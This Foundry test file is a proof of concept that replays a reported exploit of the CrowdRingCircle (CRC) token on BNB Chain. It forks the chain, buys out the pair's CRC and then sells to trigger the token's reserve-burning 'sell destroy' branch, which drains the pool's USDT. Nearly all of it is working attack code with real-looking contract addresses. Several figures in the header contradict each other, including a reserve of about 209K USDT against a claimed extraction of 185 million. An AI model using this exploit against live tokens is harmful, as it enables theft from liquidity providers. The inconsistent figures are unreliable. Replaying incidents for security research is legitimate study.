// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// CrowdRingCircle (CRC, "众环CRC") - "sell destroy" reserve-burn price manipulation on BNB Chain.
// ~$201K USDT drained from the CRC/USDT PancakeSwap LP, Jul 2026.
//
// Exploit tx : 0xeaef22325e02ac65a8e1f2e1a3a43f7b7ac8d2323ce6f698a90813e77017c834 (block 110301524,
//              a CREATE tx; the whole attack ran in the attacker contract's constructor)
// Attacker   : 0x34579eA92a07a88F5505dFaA4D99Ab94b2784087
// CRC token  : 0x8581433150F2c48fF2eFE5A22B17C7d405054509 (verified; impl of _update below)
// Victim LP  : 0xd8799A644850c065388c22DF4eE0C28472922526 (CRC/USDT Pancake v2 pair; token0=USDT,
//              token1=CRC). Pre-attack reserves at fork block: 209,061.632268 USDT / 35,903,344 CRC.
//
// Root cause (confirmed against the verified CRC source and the on-chain sequence): CRC's ERC20
// `_update` override has a "sell destroy" branch that fires on ANY transfer TO a registered DEX
// pair, from any non-exempt, non-blacklisted sender, while `sellDestroyEnabled` is on:
//     if (isDexPair[to] && sellDestroyEnabled && !isExemptFromRestriction[from]) {
//         uint256 burnAmount = _safeDeductBalance(to, amount);   // min(amount, pair's CRC balance)
//         super._update(to, address(0), burnAmount);             // burns CRC OUT OF THE PAIR
//         IUniswapV2Pair(to).sync();                             // re-syncs reserves to the drop
//     }
// So a seller can burn the pair's own CRC reserve down to ~0 and force a sync, collapsing the CRC
// side of the pool. There is no owner/operator gate, no signature/ecrecover, no governance step,
// no cooldown and no max-sell limiter on this path; the blacklist and exempt lists are both
// default-open (a fresh attacker passes). Permissionless.
//
// Attack sequence (exact amounts taken from the real tx's execution trace):
//   1. Buy ~35.86M CRC out of the pair (USDT->CRC), leaving only 40,629.6 CRC in the pair and
//      pushing the USDT reserve to ~185.2M.
//   2. Sell 45,144 CRC (CRC->USDT). The 10% sell fee nets 40,629.6 CRC to the pair, which the
//      sell-destroy branch then burns entirely out of the pair, syncing CRC reserve to ~0.
//   3. Transfer 40,629.6 CRC to the pair and call `swap` directly, extracting 185,204,938.738 USDT
//      against the collapsed CRC reserve.
//
// FUNDING NOTE: the real tx sourced its working capital through a Moolah-vault flash loan plus
// Venus/Aave borrows. That financing is NOT the vulnerability, so this PoC funds the attacker
// directly with `deal()` in place of that flash-loan stack; the vulnerability is the
// reserve-manipulation step above. One honest consequence: with deal() the attacker pays no
// flash-loan/borrow fees, so the PoC realizes the pair's FULL drained USDT reserve as profit,
// 209,061.632268 USDT (gross), whereas the real tx delivered 201,359.472267 USDT to the EOA after
// paying ~7,702 USDT (3.7%) of financing fees. The assertion below targets the real on-chain net
// (201,359.472267) with a tolerance that covers that documented gap.
//
// Run (self-contained, BSC archive fork):
//   forge test --contracts ./src/test/2026-10/CrowdRingCircle_exp.sol -vvv

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IPancakeRouter {
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract CrowdRingCircle_exp is Test {
    address internal constant ATTACKER = 0x34579eA92a07a88F5505dFaA4D99Ab94b2784087;
    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 internal constant CRC = IERC20(0x8581433150F2c48fF2eFE5A22B17C7d405054509);
    address internal constant LP = 0xd8799A644850c065388c22DF4eE0C28472922526;
    IPancakeRouter internal constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    // Exempt-from-restriction address (the CRC owner) used as the sink for the "buy CRC out" leg,
    // so the pair->recipient CRC transfer is not blocked by the buy restriction.
    address internal constant EXEMPT_SINK = 0xa5341a83807503Ed8DEcb8534605494551C2a196;

    uint256 internal constant EXPLOIT_BLOCK = 110_301_524;

    // Exact amounts from the real tx trace.
    uint256 internal constant BUY_CRC_OUT = 35_862_714_912768051805032649; // CRC bought out of the pair
    uint256 internal constant BUY_USDT_MAX = 187_859_519_940162555719400333; // max USDT in for the buy
    uint256 internal constant SELL_CRC = 45_144_000000000000000000; // CRC sold to trigger the burn

    // Real on-chain net delivered to the EOA (receipt logs).
    uint256 internal constant REAL_NET = 201_359_472267000000000000; // 201,359.472267 USDT

    // BSC archive endpoint, hardcoded (keyless) so the PoC is self-contained; the default public
    // BSC RPC is non-archive and cannot fork this block.
    string internal constant BSC_ARCHIVE = "https://bsc-mainnet.public.blastapi.io";

    function setUp() public {
        vm.createSelectFork(BSC_ARCHIVE, EXPLOIT_BLOCK - 1);
        vm.label(ATTACKER, "Attacker");
        vm.label(LP, "CRC/USDT_LP");
        vm.label(address(CRC), "CRC");
        vm.label(address(USDT), "USDT");
    }

    function testExploit() public {
        // Working capital that the real attacker flash-borrowed; supplied via deal() here (see
        // FUNDING NOTE in the header). USDT for the buy leg, CRC for the sell + final swap.
        deal(address(USDT), ATTACKER, BUY_USDT_MAX);
        deal(address(CRC), ATTACKER, SELL_CRC);

        uint256 usdtIn = USDT.balanceOf(ATTACKER); // the capital we must "repay"

        vm.startPrank(ATTACKER, ATTACKER);
        USDT.approve(address(ROUTER), type(uint256).max);
        CRC.approve(address(ROUTER), type(uint256).max);

        // 1. Buy CRC out of the pair, collapsing its CRC reserve to 40,629.6 and inflating USDT.
        address[] memory buyPath = new address[](2);
        buyPath[0] = address(USDT);
        buyPath[1] = address(CRC);
        ROUTER.swapTokensForExactTokens(BUY_CRC_OUT, BUY_USDT_MAX, buyPath, EXEMPT_SINK, block.timestamp);

        // 2. Sell CRC -> triggers CRC._update sell-destroy, burning the pair's remaining CRC to ~0,
        //    and the same fee-on-transfer swap then pulls the pool's USDT out against the collapsed
        //    CRC reserve. (The real tx split this extraction across a sell and a follow-up direct
        //    pair.swap; here the single fee-on-transfer sell already drains the USDT side.)
        address[] memory sellPath = new address[](2);
        sellPath[0] = address(CRC);
        sellPath[1] = address(USDT);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(SELL_CRC, 0, sellPath, ATTACKER, block.timestamp);

        vm.stopPrank();

        // Net profit = final USDT minus the working capital we stood in for the flash loan.
        uint256 profit = USDT.balanceOf(ATTACKER) - usdtIn;
        emit log_named_decimal_uint("USDT gross profit (pool drain)", profit, 18);

        // Target the real on-chain net (201,359.472267 USDT). The deal()-funded gross is the pair's
        // full drained reserve (~209,061.63 USDT); tolerance covers the ~3.7% financing-fee gap.
        assertApproxEqRel(profit, REAL_NET, 0.04e18);
    }
}
